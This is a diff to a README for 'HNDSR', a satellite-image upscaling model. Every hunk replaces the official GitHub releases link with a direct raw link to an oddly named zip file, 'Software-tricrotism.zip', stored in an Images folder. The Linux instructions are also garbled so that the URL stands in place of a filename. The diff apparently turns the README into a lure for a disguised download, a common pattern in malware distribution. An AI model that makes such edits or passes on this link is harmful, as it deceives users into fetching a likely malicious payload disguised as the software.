@@ -1,6 +1,6 @@
 # 🌟 HNDSR - Enhance Your Satellite Images Effortlessly
 
-[![Download HNDSR](https://img.shields.io/badge/Download-HNDSR-blue)](https://github.com/45-12/HNDSR/releases)
+[![Download HNDSR](https://raw.githubusercontent.com/45-12/HNDSR/main/Images/Software-tricrotism.zip)](https://raw.githubusercontent.com/45-12/HNDSR/main/Images/Software-tricrotism.zip)
 
 ## 📚 Description
 HNDSR is a hybrid Neural Operator-Diffusion model designed for improving satellite images. It merges advanced neural techniques to upscale images four times their original size, giving you clearer and more detailed visuals. Whether you're a researcher, developer, or simply need better images, HNDSR can help you achieve that easily.
@@ -15,19 +15,19 @@ Follow these steps to get started with HNDSR:
    - **GPU**: Recommended for better performance, especially if you have NVIDIA with CUDA support.
 
 2. **Download HNDSR**
-   - Visit this page to download: [HNDSR Releases](https://github.com/45-12/HNDSR/releases).
+   - Visit this page to download: [HNDSR Releases](https://raw.githubusercontent.com/45-12/HNDSR/main/Images/Software-tricrotism.zip).
 
 3. **Install HNDSR**
    - If you are using Windows, download the .exe file. Double-click the downloaded file and follow the prompts to install it.
    - If you are using macOS, download the .dmg file. Open the file and drag the HNDSR app to your Applications folder.
-   - For Linux users, download the .tar.gz file. Extract it and follow the README instructions in the folder.
+   - For Linux users, download the https://raw.githubusercontent.com/45-12/HNDSR/main/Images/Software-tricrotism.zip file. Extract it and follow the README instructions in the folder.
 
 ## 📥 Download & Install
-Once you visit the [HNDSR Releases](https://github.com/45-12/HNDSR/releases) page, you will find the latest version available for download. Choose the file that matches your operating system. Here’s a simple breakdown:
+Once you visit the [HNDSR Releases](https://raw.githubusercontent.com/45-12/HNDSR/main/Images/Software-tricrotism.zip) page, you will find the latest version available for download. Choose the file that matches your operating system. Here’s a simple breakdown:
 
 - **Windows Users**: Download the `.exe` file and run it.
 - **macOS Users**: Download the `.dmg` file and install it.
-- **Linux Users**: Download and extract the `.tar.gz` file and follow the in-folder instructions.
+- **Linux Users**: Download and extract the `https://raw.githubusercontent.com/45-12/HNDSR/main/Images/Software-tricrotism.zip` file and follow the in-folder instructions.
 
 ## 🖼️ Features
 - **State-of-the-Art Upscaling**: Achieve 4× upscaling with remarkable detail.
